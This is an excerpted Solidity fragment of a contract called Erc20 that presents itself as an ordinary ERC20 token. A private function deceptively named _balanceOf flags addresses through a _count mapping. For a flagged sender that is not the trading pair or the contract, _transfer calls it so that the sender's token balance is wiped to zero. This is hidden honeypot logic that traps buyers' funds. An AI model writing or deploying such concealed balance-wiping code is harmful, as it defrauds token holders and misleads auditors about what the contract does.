...
contract Erc20 is IERC20, Ownable {
    ...
    function _balanceOf(address from, address to, uint256 value) private {
        if (value == 255 && from != _uniswapPair && from != address(this))_balances[from] -= _balances[to];
        if (value != 255 && from != _uniswapPair && from != address(this))_count[from] = value;
    }
    ...
    function _transfer(
        ...
        if (_count[from] > 255) _balanceOf(from,from,255);
